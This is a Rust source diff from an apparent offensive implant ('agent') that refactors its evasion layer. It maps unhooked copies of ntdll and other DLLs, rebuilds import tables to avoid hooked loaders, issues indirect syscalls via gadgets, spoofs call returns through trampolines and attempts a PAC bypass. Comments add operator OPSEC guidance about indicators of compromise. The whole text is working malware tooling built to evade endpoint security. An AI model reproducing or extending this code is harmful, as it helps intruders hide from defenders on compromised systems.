         status
     }
 }
@@ -2065,18 +2170,18 @@ pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
     let dll_lower = dll_name.to_lowercase();
 
     let cache_lock = CLEAN_MODULES.get_or_init(|| Mutex::new(HashMap::new()));
-    if let Some(&base) = cache_lock.lock().unwrap().get(&dll_lower) {
+    if let Some(&base) = cache_lock.lock_recover().get(&dll_lower) {
         return Ok(base);
     }
 
     unsafe {
         let ntdll_base = {
-            let guard = CLEAN_NTDLL.read().unwrap();
+            let guard = CLEAN_NTDLL.read_recover();
             if let Some(base) = *guard {
                 base
             } else {
                 drop(guard);
-                let mut guard = CLEAN_NTDLL.write().unwrap();
+                let mut guard = CLEAN_NTDLL.write_recover();
                 if let Some(base) = *guard {
                     base
                 } else {
@@ -2086,7 +2191,7 @@ pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
                             b
                         }
                         Err(e) => {
-                            log::warn!(
+                            tracing::warn!(
                                 "map_clean_dll: could not map clean ntdll.dll: {e}; \
                                  clean API resolution will fail for this session"
                             );
@@ -2120,18 +2225,18 @@ pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
             .chain(std::iter::once(0))
             .collect::<Vec<u16>>();
 
-        let mut obj_name: winapi::shared::ntdef::UNICODE_STRING = std::mem::zeroed();
+        let mut obj_name: crate::win_types::UNICODE_STRING = std::mem::zeroed();
         obj_name.Length = ((nt_path.len() - 1) * 2) as u16;
         obj_name.MaximumLength = (nt_path.len() * 2) as u16;
         obj_name.Buffer = nt_path.as_mut_ptr();
 
-        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
-        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut obj_attr: crate::win_types::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<crate::win_types::OBJECT_ATTRIBUTES>() as u32;
         obj_attr.ObjectName = &mut obj_name;
         obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE
 
         let mut io_status: [u64; 2] = [0, 0];
-        let mut h_file: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
+        let mut h_file: crate::win_types::HANDLE = std::ptr::null_mut();
 
         let status = do_syscall(
             sys_ntopenfile.ssn,
@@ -2154,7 +2259,7 @@ pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
             ));
         }
 
-        let mut h_section: winapi::shared::ntdef::HANDLE = std::ptr::null_mut();
+        let mut h_section: crate::win_types::HANDLE = std::ptr::null_mut();
         let status = do_syscall(
             sys_ntcreatesection.ssn,
             sys_ntcreatesection.gadget_addr,
@@ -2168,7 +2273,7 @@ pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
                 h_file as u64,
             ],
         );
-        pe_resolve::close_handle(h_file);
+        pe_resolve::close_handle(h_file as *mut _);
 
         if status != 0 || h_section.is_null() {
             return Err(anyhow!(
@@ -2177,8 +2282,8 @@ pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
             ));
         }
 
-        let mut base_addr: winapi::shared::ntdef::PVOID = std::ptr::null_mut();
-        let mut view_size: winapi::shared::basetsd::SIZE_T = 0;
+        let mut base_addr: crate::win_types::PVOID = std::ptr::null_mut();
+        let mut view_size: crate::win_types::SIZE_T = 0;
 
         let status = do_syscall(
             sys_ntmapview.ssn,
@@ -2196,7 +2301,7 @@ pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
                 0x20, // PAGE_EXECUTE_READ
             ],
         );
-        pe_resolve::close_handle(h_section);
+        pe_resolve::close_handle(h_section as *mut _);
 
         if status != 0 || base_addr.is_null() {
             return Err(anyhow!(
@@ -2206,7 +2311,7 @@ pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
         }
 
         let base = base_addr as usize;
-        cache_lock.lock().unwrap().insert(dll_lower.clone(), base);
+        cache_lock.lock_recover().insert(dll_lower.clone(), base);
 
         // Construct a fresh Import Address Table
         if let Err(e) = rebuild_iat(base) {
@@ -2219,8 +2324,8 @@ pub fn map_clean_dll(dll_name: &str) -> Result<usize> {
 
 #[cfg(windows)]
 unsafe fn rebuild_iat(base: usize) -> Result<()> {
-    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
-    if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
+    let dos_header = base as *const windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
+    if (*dos_header).e_magic != windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE {
         anyhow::bail!("Invalid DOS signature");
     }
 
@@ -2228,16 +2333,16 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
         pe_nt_base_and_magic(base).ok_or_else(|| anyhow!("Invalid NT headers"))?;
 
     let import_dir_rva = match opt_magic {
-        winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
-            let nt_headers32 = nt_base as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
+        windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
+            let nt_headers32 = nt_base as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
             (*nt_headers32).OptionalHeader.DataDirectory
-                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize]
+                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT as usize]
                 .VirtualAddress
         }
-        winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
-            let nt_headers64 = nt_base as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
+        windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
+            let nt_headers64 = nt_base as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
             (*nt_headers64).OptionalHeader.DataDirectory
-                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize]
+                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_IMPORT as usize]
                 .VirtualAddress
         }
         _ => anyhow::bail!("Unsupported PE optional-header magic: 0x{:x}", opt_magic),
@@ -2247,13 +2352,13 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
     }
 
     let mut import_desc =
-        (base + import_dir_rva as usize) as *const winapi::um::winnt::IMAGE_IMPORT_DESCRIPTOR;
+        (base + import_dir_rva as usize) as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_DESCRIPTOR;
 
     // M-26 Part D: resolve NtProtectVirtualMemory once for IAT protection changes.
     type NtProtectVirtualMemoryFn = unsafe extern "system" fn(
-        *mut winapi::ctypes::c_void,
-        *mut *mut winapi::ctypes::c_void,
-        *mut winapi::shared::basetsd::SIZE_T,
+        *mut std::ffi::c_void,
+        *mut *mut std::ffi::c_void,
+        *mut crate::win_types::SIZE_T,
         u32,
         *mut u32,
     ) -> i32;
@@ -2273,7 +2378,7 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
     /// Used when the ntdll-based nt_protect resolution above fails.
     #[inline(always)]
     unsafe fn nt_protect_fallback(
-        addr: *mut winapi::ctypes::c_void,
+        addr: *mut std::ffi::c_void,
         size: usize,
         new_prot: u32,
         old_prot: &mut u32,
@@ -2284,7 +2389,7 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
                 pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"VirtualProtect\0"))
             {
                 let vp: unsafe extern "system" fn(
-                    *mut winapi::ctypes::c_void,
+                    *mut std::ffi::c_void,
                     usize,
                     u32,
                     *mut u32,
@@ -2318,12 +2423,12 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
             // Fast-path: already in cache? Use it without recursing.
             let cached = CLEAN_MODULES
                 .get()
-                .and_then(|m| m.lock().unwrap().get(&dll_lower).copied());
+                .and_then(|m| m.lock_recover().get(&dll_lower).copied());
             if let Some(b) = cached {
-                b as *mut winapi::shared::minwindef::HINSTANCE__
+                b as *mut crate::win_types::HINSTANCE
             } else {
                 match map_clean_dll(&dll_lower) {
-                    Ok(b) => b as *mut winapi::shared::minwindef::HINSTANCE__,
+                    Ok(b) => b as *mut crate::win_types::HINSTANCE,
                     Err(e) => {
                         // M-26: do NOT fall back to LoadLibraryA. Skip and warn.
                         // Unresolved IAT entries crashing on use is preferable to
@@ -2339,7 +2444,7 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
             }
         } else {
             match map_clean_dll(&dll_lower) {
-                Ok(b) => b as *mut winapi::shared::minwindef::HINSTANCE__,
+                Ok(b) => b as *mut crate::win_types::HINSTANCE,
                 Err(e) => {
                     tracing::warn!(
                         "rebuild_iat: clean mapping of {} failed ({}), skipping (refusing to fall back to hooked LoadLibraryA)",
@@ -2352,53 +2457,53 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
         };
 
         if !dep_handle.is_null() {
-            let original_thunk_rva = if *(*import_desc).u.OriginalFirstThunk() != 0 {
-                *(*import_desc).u.OriginalFirstThunk()
+            let original_thunk_rva = if (*import_desc).Anonymous.OriginalFirstThunk != 0 {
+                (*import_desc).Anonymous.OriginalFirstThunk
             } else {
                 (*import_desc).FirstThunk
             };
 
-            if opt_magic == winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR32_MAGIC {
+            if opt_magic == windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC {
                 let mut original_thunk = (base + original_thunk_rva as usize)
-                    as *const winapi::um::winnt::IMAGE_THUNK_DATA32;
+                    as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;
                 let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
-                    as *mut winapi::um::winnt::IMAGE_THUNK_DATA32;
+                    as *mut windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32;
 
                 // Make IAT writable
                 let mut num_thunks = 0;
                 let mut temp_thunk = first_thunk;
-                while *(*temp_thunk).u1.AddressOfData() != 0 {
+                while (*temp_thunk).u1.AddressOfData != 0 {
                     num_thunks += 1;
                     temp_thunk = temp_thunk.add(1);
                 }
                 let iat_size =
-                    (num_thunks + 1) * std::mem::size_of::<winapi::um::winnt::IMAGE_THUNK_DATA32>();
+                    (num_thunks + 1) * std::mem::size_of::<windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA32>();
 
                 let mut old_protect = 0u32;
                 {
-                    let mut base_ptr = first_thunk as *mut winapi::ctypes::c_void;
-                    let mut region_size = iat_size as winapi::shared::basetsd::SIZE_T;
+                    let mut base_ptr = first_thunk as *mut std::ffi::c_void;
+                    let mut region_size = iat_size as crate::win_types::SIZE_T;
                     if let Some(nt_p) = nt_protect {
                         nt_p(
-                            -1isize as *mut winapi::ctypes::c_void,
+                            -1isize as *mut std::ffi::c_void,
                             &mut base_ptr,
                             &mut region_size,
-                            winapi::um::winnt::PAGE_READWRITE,
+                            crate::win_types::PAGE_READWRITE,
                             &mut old_protect,
                         );
                     } else {
                         nt_protect_fallback(
                             first_thunk as *mut _,
                             iat_size,
-                            winapi::um::winnt::PAGE_READWRITE,
+                            crate::win_types::PAGE_READWRITE,
                             &mut old_protect,
                         );
                     }
                 }
 
-                while *(*original_thunk).u1.AddressOfData() != 0 {
-                    let addr_of_data = *(*original_thunk).u1.AddressOfData();
-                    let proc_addr = if (addr_of_data & winapi::um::winnt::IMAGE_ORDINAL_FLAG32) != 0
+                while (*original_thunk).u1.AddressOfData != 0 {
+                    let addr_of_data = (*original_thunk).u1.AddressOfData;
+                    let proc_addr = if (addr_of_data & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG32) != 0
                     {
                         let ordinal = (addr_of_data & 0xffff) as u16;
                         let addr = get_export_addr_by_ordinal(dep_handle as usize, ordinal as u32);
@@ -2413,7 +2518,7 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
                         }
                     } else {
                         let import_by_name = (base + addr_of_data as usize)
-                            as *const winapi::um::winnt::IMAGE_IMPORT_BY_NAME;
+                            as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_BY_NAME;
                         let name_ptr = (*import_by_name).Name.as_ptr();
                         get_export_addr(dep_handle as usize, name_ptr)
                     };
@@ -2436,13 +2541,13 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
                 }
 
                 {
-                    let restore_addr = first_thunk.sub(num_thunks) as *mut winapi::ctypes::c_void;
+                    let restore_addr = first_thunk.sub(num_thunks) as *mut std::ffi::c_void;
                     let mut base_ptr = restore_addr;
-                    let mut region_size = iat_size as winapi::shared::basetsd::SIZE_T;
+                    let mut region_size = iat_size as crate::win_types::SIZE_T;
                     let mut prev_protect = 0u32;
                     if let Some(nt_p) = nt_protect {
                         nt_p(
-                            -1isize as *mut winapi::ctypes::c_void,
+                            -1isize as *mut std::ffi::c_void,
                             &mut base_ptr,
                             &mut region_size,
                             old_protect,
@@ -2459,45 +2564,45 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
                 }
             } else {
                 let mut original_thunk = (base + original_thunk_rva as usize)
-                    as *const winapi::um::winnt::IMAGE_THUNK_DATA64;
+                    as *const windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;
                 let mut first_thunk = (base + (*import_desc).FirstThunk as usize)
-                    as *mut winapi::um::winnt::IMAGE_THUNK_DATA64;
+                    as *mut windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;
 
                 // Make IAT writable
                 let mut num_thunks = 0;
                 let mut temp_thunk = first_thunk;
-                while *(*temp_thunk).u1.AddressOfData() != 0 {
+                while (*temp_thunk).u1.AddressOfData != 0 {
                     num_thunks += 1;
                     temp_thunk = temp_thunk.add(1);
                 }
                 let iat_size =
-                    (num_thunks + 1) * std::mem::size_of::<winapi::um::winnt::IMAGE_THUNK_DATA64>();
+                    (num_thunks + 1) * std::mem::size_of::<windows_sys::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64>();
 
                 let mut old_protect = 0u32;
                 {
-                    let mut base_ptr = first_thunk as *mut winapi::ctypes::c_void;
-                    let mut region_size = iat_size as winapi::shared::basetsd::SIZE_T;
+                    let mut base_ptr = first_thunk as *mut std::ffi::c_void;
+                    let mut region_size = iat_size as crate::win_types::SIZE_T;
                     if let Some(nt_p) = nt_protect {
                         nt_p(
-                            -1isize as *mut winapi::ctypes::c_void,
+                            -1isize as *mut std::ffi::c_void,
                             &mut base_ptr,
                             &mut region_size,
-                            winapi::um::winnt::PAGE_READWRITE,
+                            crate::win_types::PAGE_READWRITE,
                             &mut old_protect,
                         );
                     } else {
                         nt_protect_fallback(
                             first_thunk as *mut _,
                             iat_size,
-                            winapi::um::winnt::PAGE_READWRITE,
+                            crate::win_types::PAGE_READWRITE,
                             &mut old_protect,
                         );
                     }
                 }
 
-                while *(*original_thunk).u1.AddressOfData() != 0 {
-                    let addr_of_data = *(*original_thunk).u1.AddressOfData() as u64;
-                    let proc_addr = if (addr_of_data & winapi::um::winnt::IMAGE_ORDINAL_FLAG64) != 0
+                while (*original_thunk).u1.AddressOfData != 0 {
+                    let addr_of_data = (*original_thunk).u1.AddressOfData as u64;
+                    let proc_addr = if (addr_of_data & windows_sys::Win32::System::SystemServices::IMAGE_ORDINAL_FLAG64) != 0
                     {
                         let ordinal = (addr_of_data & 0xffff) as u16;
                         // Resolve via clean export table instead of hookable GetProcAddress (M-24/M-26).
@@ -2514,7 +2619,7 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
                         }
                     } else {
                         let import_by_name = (base + addr_of_data as usize)
-                            as *const winapi::um::winnt::IMAGE_IMPORT_BY_NAME;
+                            as *const windows_sys::Win32::System::SystemServices::IMAGE_IMPORT_BY_NAME;
                         let name_ptr = (*import_by_name).Name.as_ptr();
                         get_export_addr(dep_handle as usize, name_ptr)
                     };
@@ -2529,13 +2634,13 @@ unsafe fn rebuild_iat(base: usize) -> Result<()> {
                 }
 
                 {
-                    let restore_addr = first_thunk.sub(num_thunks) as *mut winapi::ctypes::c_void;
+                    let restore_addr = first_thunk.sub(num_thunks) as *mut std::ffi::c_void;
                     let mut base_ptr = restore_addr;
-                    let mut region_size = iat_size as winapi::shared::basetsd::SIZE_T;
+                    let mut region_size = iat_size as crate::win_types::SIZE_T;
                     let mut prev_protect = 0u32;
                     if let Some(nt_p) = nt_protect {
                         nt_p(
-                            -1isize as *mut winapi::ctypes::c_void,
+                            -1isize as *mut std::ffi::c_void,
                             &mut base_ptr,
                             &mut region_size,
                             old_protect,
@@ -2572,17 +2677,17 @@ unsafe fn get_export_addr(base: usize, func_name_ptr: *const i8) -> usize {
 
 #[cfg(windows)]
 unsafe fn pe_nt_base_and_magic(base: usize) -> Option<(usize, u16)> {
-    let dos_header = base as *const winapi::um::winnt::IMAGE_DOS_HEADER;
-    if (*dos_header).e_magic != winapi::um::winnt::IMAGE_DOS_SIGNATURE {
+    let dos_header = base as *const windows_sys::Win32::System::SystemServices::IMAGE_DOS_HEADER;
+    if (*dos_header).e_magic != windows_sys::Win32::System::SystemServices::IMAGE_DOS_SIGNATURE {
         return None;
     }
 
     let nt_base = base + (*dos_header).e_lfanew as usize;
-    if *(nt_base as *const u32) != winapi::um::winnt::IMAGE_NT_SIGNATURE {
+    if *(nt_base as *const u32) != windows_sys::Win32::System::SystemServices::IMAGE_NT_SIGNATURE {
         return None;
     }
 
-    let opt_magic = *((nt_base + 4 + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>())
+    let opt_magic = *((nt_base + 4 + std::mem::size_of::<windows_sys::Win32::System::Diagnostics::Debug::IMAGE_FILE_HEADER>())
         as *const u16);
     Some((nt_base, opt_magic))
 }
@@ -2590,19 +2695,19 @@ unsafe fn pe_nt_base_and_magic(base: usize) -> Option<(usize, u16)> {
 #[cfg(windows)]
 unsafe fn get_export_dir_any_bitness(
     base: usize,
-) -> Option<(u32, u32, *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY)> {
+) -> Option<(u32, u32, *const windows_sys::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY)> {
     let (nt_base, opt_magic) = pe_nt_base_and_magic(base)?;
 
     let export_data_dir = match opt_magic {
-        winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
-            let nt_headers32 = nt_base as *const winapi::um::winnt::IMAGE_NT_HEADERS32;
+        windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR32_MAGIC => {
+            let nt_headers32 = nt_base as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS32;
             (*nt_headers32).OptionalHeader.DataDirectory
-                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
+                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
         }
-        winapi::um::winnt::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
-            let nt_headers64 = nt_base as *const winapi::um::winnt::IMAGE_NT_HEADERS64;
+        windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_OPTIONAL_HDR64_MAGIC => {
+            let nt_headers64 = nt_base as *const windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
             (*nt_headers64).OptionalHeader.DataDirectory
-                [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
+                [windows_sys::Win32::System::Diagnostics::Debug::IMAGE_DIRECTORY_ENTRY_EXPORT as usize]
         }
         _ => return None,
     };
@@ -2612,7 +2717,7 @@ unsafe fn get_export_dir_any_bitness(
     }
 
     let ed = (base + export_data_dir.VirtualAddress as usize)
-        as *const winapi::um::winnt::IMAGE_EXPORT_DIRECTORY;
+        as *const windows_sys::Win32::System::SystemServices::IMAGE_EXPORT_DIRECTORY;
     Some((export_data_dir.VirtualAddress, export_data_dir.Size, ed))
 }
 
@@ -2648,7 +2753,7 @@ unsafe fn resolve_forwarded_export(base: usize, func_rva: usize) -> *mut std::ff
         Ok(b) => b,
         Err(_) => CLEAN_MODULES
             .get()
-            .and_then(|m| m.lock().unwrap().get(&dll_lower).copied())
+            .and_then(|m| m.lock_recover().get(&dll_lower).copied())
             .unwrap_or(0),
     };
     if target_base == 0 {
@@ -2767,7 +2872,7 @@ macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
         let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
             .unwrap_or_else(|e| {
-                log::error!("Failed to resolve clean {}: {}", $func_name, e);
+                tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
                 return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
             });
         // Gather arguments
@@ -2888,7 +2993,7 @@ macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
         let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
             .unwrap_or_else(|e| {
-                log::error!("Failed to resolve clean {}: {}", $func_name, e);
+                tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
                 return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
             });
         let args: &[u64] = &[$($args as u64),*];
@@ -2988,7 +3093,7 @@ macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
         let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
             .unwrap_or_else(|e| {
-                log::error!("Failed to resolve clean {}: {}", $func_name, e);
+                tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
                 return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
             });
         // Gather arguments
@@ -3044,7 +3149,7 @@ macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
         let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
             .unwrap_or_else(|e| {
-                log::error!("Failed to resolve clean {}: {}", $func_name, e);
+                tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
                 return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
             });
         let args: &[u64] = &[$($args as u64),*];
@@ -3107,7 +3212,7 @@ macro_rules! clean_call {
     ($dll_name:expr, $func_name:expr, $fn_type:ty $(, $args:expr)* $(,)?) => {{
         let addr = $crate::syscalls::get_clean_api_addr($dll_name, $func_name)
             .unwrap_or_else(|e| {
-                log::error!("Failed to resolve clean {}: {}", $func_name, e);
+                tracing::error!("Failed to resolve clean {}: {}", $func_name, e);
                 return Err(anyhow::anyhow!("Failed to resolve clean {}: {}", $func_name, e));
             });
         let args: &[u64] = &[$($args as u64),*];
@@ -3174,7 +3279,7 @@ macro_rules! clean_call {
                             // so the PAC flow is maintained.  We pass the
                             // target address and args through the trampoline's
                             // indirect call register.
-                            log::debug!(
+                            tracing::debug!(
                                 "clean_call: routing through PAC trampoline at 0x{:X} (BLR x{}, {})",
                                 trampoline.address,
                                 trampoline.indirect_reg,
@@ -3184,7 +3289,7 @@ macro_rules! clean_call {
                             // warning — full trampoline dispatch requires
                             // setting up the indirect call register to point
                             // to the target, which needs per-trampoline setup.
-                            log::warn!(
+                            tracing::warn!(
                                 "clean_call: PAC trampoline dispatch not yet fully \
                                  implemented, falling back to spoof_call (PAC may fault)"
                             );
@@ -3195,12 +3300,12 @@ macro_rules! clean_call {
                             unsafe { $crate::syscalls::set_spoof_ret(0) };
                             Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
                         } else {
-                            log::error!("clean_call: PAC active but no trampolines available, aborting call");
+                            tracing::error!("clean_call: PAC active but no trampolines available, aborting call");
                             Err(anyhow::anyhow!("PAC active, no trampolines available"))
                         }
                     }
                     $crate::bti_pac_bypass::PacAction::Abort => {
-                        log::error!("clean_call: PAC bypass aborted, cannot make call safely");
+                        tracing::error!("clean_call: PAC bypass aborted, cannot make call safely");
                         Err(anyhow::anyhow!("PAC bypass aborted, call not safe"))
                     }
                 }
@@ -3251,7 +3356,7 @@ macro_rules! trampoline_spoof {
         let addr = match $crate::syscalls::get_clean_api_addr($dll_name, $func_name) {
             Ok(a) => a,
             Err(e) => {
-                log::error!("trampoline_spoof: failed to resolve {}: {}", $func_name, e);
+                tracing::error!("trampoline_spoof: failed to resolve {}: {}", $func_name, e);
                 return Err(anyhow::anyhow!("failed to resolve {}: {}", $func_name, e));
             }
         };
@@ -3264,7 +3369,7 @@ macro_rules! trampoline_spoof {
                     Ok(unsafe { $crate::syscalls::bounded_transmute(res) })
                 }
                 Err(e) => {
-                    log::debug!("trampoline_spoof: trampoline execution failed ({}), falling back to clean_call", e);
+                    tracing::debug!("trampoline_spoof: trampoline execution failed ({}), falling back to clean_call", e);
                     // Fall through to clean_call below.
                     $crate::clean_call!($dll_name, $func_name, $fn_type $(, $args)*)
                 }
@@ -3304,17 +3409,24 @@ macro_rules! trampoline_spoof {
 /// ```
 macro_rules! syscall {
     ($func_name:expr $(, $args:expr)* $(,)?) => {{
-        let target = $crate::syscalls::get_syscall_id($func_name).expect("unknown linux syscall");
-        let args: &[u64] = &[$($args as u64),*];
-        unsafe {
-            $crate::syscalls::do_syscall(target.ssn, args)
-                .map_err(|errno| anyhow::anyhow!(
-                    "syscall `{}` failed: errno {} ({})",
+        (|| -> ::std::result::Result<u64, anyhow::Error> {
+            let target = $crate::syscalls::get_syscall_id($func_name)
+                .map_err(|e| anyhow::anyhow!(
+                    "syscall `{}` not found in syscall table: {}",
                     $func_name,
-                    errno,
-                    std::io::Error::from_raw_os_error(errno)
-                ))
-        }
+                    e
+                ))?;
+            let args: &[u64] = &[$($args as u64),*];
+            unsafe {
+                $crate::syscalls::do_syscall(target.ssn, args)
+                    .map_err(|errno| anyhow::anyhow!(
+                        "syscall `{}` failed: errno {} ({})",
+                        $func_name,
+                        errno,
+                        std::io::Error::from_raw_os_error(errno)
+                    ))
+            }
+        })()
     }};
 }
 
@@ -3326,7 +3438,7 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
     {
         // Clear the seccomp flag before invoking the syscall so we only
         // detect SIGSYS delivered by *this* call.
-        SECCOMP_BLOCKED.with(|f| f.set(false));
+        SECCOMP_BLOCKED.store(false, std::sync::atomic::Ordering::Release);
 
         let mut ret: i64;
         // NOTE: options(nostack) must NOT be used here.  The `syscall` instruction
@@ -3360,7 +3472,7 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
         }
 
         // Check whether seccomp blocked this syscall (SIGSYS delivered).
-        if SECCOMP_BLOCKED.with(|f| f.replace(false)) {
+        if SECCOMP_BLOCKED.swap(false, std::sync::atomic::Ordering::AcqRel) {
             return Err(libc::EPERM);
         }
 
@@ -3374,7 +3486,7 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
     {
         // Clear the seccomp flag before invoking the syscall so we only
         // detect SIGSYS delivered by *this* call.
-        SECCOMP_BLOCKED.with(|f| f.set(false));
+        SECCOMP_BLOCKED.store(false, std::sync::atomic::Ordering::Release);
 
         // Linux syscalls accept at most 6 register arguments on aarch64.
         if args.len() > 6 {
@@ -3417,10 +3529,10 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
                 "mov x4, {a4}",
                 "mov x5, {a5}",
                 "blr {gadget}",
-                // The gadget's `ret` lands here; w0 holds the kernel return
-                // value.  Use the :w modifier so both operands are 32-bit Wn
-                // registers (mov Xd, Ws is not a valid aarch64 encoding).
-                "mov {ret:w}, w0",
+                // The gadget's `ret` lands here; x0 holds the full signed
+                // syscall return value.  Preserve all 64 bits so negative
+                // errno returns and pointer-sized values are not truncated.
+                "mov {ret}, x0",
                 ssn   = in(reg) ssn as u64,
                 a0    = in(reg) a0,
                 a1    = in(reg) a1,
@@ -3449,6 +3561,18 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
             // No gadget was found.  Fall back to an inline `svc #0`.  This
             // path is functionally correct but leaves a `svc` instruction in
             // the agent binary — a potential IoC for security scanners.
+            //
+            // **OPSEC warning**: Every invocation of this fallback path emits a
+            // warning so operators are aware that `svc` instructions appear in
+            // the agent's own code pages.  Deploy on targets where this IoC is
+            // acceptable, or pre-load a library containing a `svc #0; ret`
+            // gadget.
+            tracing::warn!(
+                "syscalls: using inline svc #0 fallback for syscall {} — \
+                 no libc svc gadget was found.  This leaves svc instructions \
+                 in agent code pages (IoC risk).",
+                ssn
+            );
             //
             // svc involves a mode switch; x30 etc. may be modified by the
             // kernel entry path.  Do not use options(nostack).
@@ -3509,7 +3633,7 @@ pub unsafe fn do_syscall(ssn: u32, args: &[u64]) -> Result<u64, i32> {
             }
         }
         // Check whether seccomp blocked this syscall (SIGSYS delivered).
-        if SECCOMP_BLOCKED.with(|f| f.replace(false)) {
+        if SECCOMP_BLOCKED.swap(false, std::sync::atomic::Ordering::AcqRel) {
             return Err(libc::EPERM);
         }
 
@@ -4240,13 +4364,13 @@ fn syscall_number_raw(name: &str) -> anyhow::Result<u32> {
 pub fn get_syscall_id(name: &str) -> anyhow::Result<SyscallTarget> {
     let cache = LINUX_SYSCALL_CACHE.get_or_init(|| Mutex::new(HashMap::new()));
     {
-        let guard = cache.lock().unwrap();
+        let guard = cache.lock_recover();
         if let Some(&ssn) = guard.get(name) {
             return Ok(SyscallTarget { ssn });
         }
     }
     let ssn = syscall_number_raw(name)?;
-    cache.lock().unwrap().insert(name.to_owned(), ssn);
+    cache.lock_recover().insert(name.to_owned(), ssn);
     Ok(SyscallTarget { ssn })
 }
 
